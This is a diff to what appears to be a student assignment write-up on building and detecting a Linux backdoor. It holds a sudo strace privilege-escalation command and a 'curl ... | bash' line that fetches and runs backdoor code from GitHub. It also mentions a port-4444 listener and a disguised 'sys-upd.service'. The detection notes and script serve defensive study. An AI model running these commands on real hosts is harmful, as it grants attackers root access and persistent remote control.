@@ -40,8 +40,8 @@ Note: (I analyzed the .pcapng file in Wireshark and identified an HTTP response 
 ___________________________________
 
 
-To escalate privileges use this command:
-
+## Escalate Privileges
+To escalate privileges use this command:<br><br>
 Command: sudo strace -o /dev/null /bin/bash<br>
 Command: cd (Change Directory)<br>
 Command: curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash/backdoor | bash<br>
@@ -89,3 +89,23 @@ ___________________________________
 D) ideas on how yourbackdoor could be detected.
 
 - The backdoor can be detected using tools like Wireshark by identifying unusual traffic on port 4444.It may also be exposed through system audits by spotting suspicious services like sys-upd.service or by detecting scripts fetched from GitHub. Security tools or EDRs could flag the listener's behavior of executing remote shell commands.
+
+
+___________________________________
+
+
+Bonus points will be awarded for:
+
+Make sure [Escalate Privileges](#escalate-privileges) is done.
+
+A script or program that will detect if the host is infected with your backdoor
+
+Download the detection script<br><br>
+curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bonus/detect_backdoor.sh -o detect_backdoor.sh
+
+Make the script executable <br><br>
+chmod +x detect_backdoor.sh
+
+# Step 3: Run the script <br><br>
+./detect_backdoor.sh
+
